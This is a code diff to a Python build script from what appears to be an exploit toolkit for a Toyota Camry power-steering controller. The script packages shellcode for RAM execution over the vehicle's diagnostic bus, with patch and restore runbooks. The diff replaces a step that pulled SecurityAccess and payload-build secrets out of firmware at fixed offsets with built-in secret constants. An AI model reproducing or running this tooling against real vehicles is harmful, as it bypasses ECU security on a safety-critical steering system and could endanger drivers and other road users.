@@ -13,11 +13,17 @@ from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT))
-from tools import build_camry_f33_gate2_root_result_patch as stage3
-from tools import build_camry_f33_crypto_result_patch as stage5
 from exploit.common.payload_package import package_shellcode
+from exploit.common.ram_exec import (
+    TOYOTA_P1ME_BOOT_SECURITY_ACCESS_SECRET,
+    TOYOTA_P1ME_PAYLOAD_BUILD_SECRET,
+)
 from exploit.ephemeral_runtime import camry_f33_b6_bridge_install as bridge_install
-from exploit.ephemeral_runtime import camry_f33_b6_transaction_observer_install as observer_install
+from exploit.ephemeral_runtime import (
+    camry_f33_b6_transaction_observer_install as observer_install,
+)
+from tools import build_camry_f33_crypto_result_patch as stage5
+from tools import build_camry_f33_gate2_root_result_patch as stage3
 
 PROBE = ROOT / "exploit/behavioral_proof/camry_f33_b6_stationary_probe.py"
 RUNBOOK_TEMPLATE = ROOT / "exploit/ephemeral_runtime/camry_f33_b6_observer_runbook.md"
@@ -69,8 +75,6 @@ def patch_runbook() -> str:
     f181 = stage3.EXPECTED_F181_HEX
     boot_f181 = stage3.EXPECTED_BOOT_F181_HEX
     common = f"""--bus 0 --elm327-param 1 --uds-variant old --cpu-index 0 \\
-  --security-secret-file /tmp/f33-boot-secret.bin \\
-  --payload-secret-file /tmp/f33-payload-secret.bin \\
   --ram-load-addr 0xFEBF0000 \\
   --ram-geometry-evidence dynamic:camry-8965F3307000-20260826 \\
   --expected-f181-hex {f181} \\
@@ -143,19 +147,10 @@ export PYTHONPATH=/data/openpilot:$PWD/runtime
 pgrep -af 'pandad|boardd' || true
 ```
 
-Derive the two already-recovered EPS bootstrap inputs from the exact packaged
-CodeFlash source. They are temporary and must not be committed or copied out:
-
-```bash
-$PY - <<'PY'
-from pathlib import Path
-p = Path('firmware_patch/CodeFlash.gate2-stage2.bin')
-b = p.read_bytes()
-Path('/tmp/f33-payload-secret.bin').write_bytes(b[0xBFD8:0xBFE8])
-Path('/tmp/f33-boot-secret.bin').write_bytes(b[0xBFE8:0xBFF8])
-PY
-chmod 600 /tmp/f33-payload-secret.bin /tmp/f33-boot-secret.bin
-```
+The Toyota P1M-E payload-build and boot SecurityAccess roots are built into the
+runtime. They are byte-identical in the tracked Sienna and exact-F33 CodeFlash
+images and public in LoChuan's RH850_P1M-E image. No temporary secret files or
+environment variables are required.
 
 ## 1. NRTD zero-write preflight
 
@@ -237,11 +232,7 @@ $PY runtime/exploit/patcher/restore.py \\
 ```
 
 After any completed APPLY or RESTORE, power-cycle before interpreting normal
-application behavior. Remove transient input files when finished:
-
-```bash
-rm -f /tmp/f33-boot-secret.bin /tmp/f33-payload-secret.bin
-```
+application behavior.
 """
 
 
@@ -257,9 +248,13 @@ def build(out: Path, openpilot: Path) -> dict:
 
     ram_dir = out / "ram_payloads"
     ram_dir.mkdir(parents=True, exist_ok=True)
-    payload_secret = F33_IMAGE.read_bytes()[0xBFD8:0xBFE8]
-    observer_payload = package_shellcode(OBSERVER_BIN.read_bytes(), secret=payload_secret)
-    bridge_payload = package_shellcode(BRIDGE_BIN.read_bytes(), secret=payload_secret)
+    f33_image = F33_IMAGE.read_bytes()
+    if f33_image[0xBFD8:0xBFE8] != TOYOTA_P1ME_PAYLOAD_BUILD_SECRET:
+        raise RuntimeError("F33 payload-build root differs from built-in Toyota P1M-E root")
+    if f33_image[0xBFE8:0xBFF8] != TOYOTA_P1ME_BOOT_SECURITY_ACCESS_SECRET:
+        raise RuntimeError("F33 boot SecurityAccess root differs from built-in Toyota P1M-E root")
+    observer_payload = package_shellcode(OBSERVER_BIN.read_bytes(), secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
+    bridge_payload = package_shellcode(BRIDGE_BIN.read_bytes(), secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
     if hashlib.sha256(observer_payload).hexdigest() != observer_install.EXPECTED_PAYLOAD_SHA256:
         raise RuntimeError("observer authenticated payload identity drift")
     if hashlib.sha256(bridge_payload).hexdigest() != bridge_install.EXPECTED_PAYLOAD_SHA256:
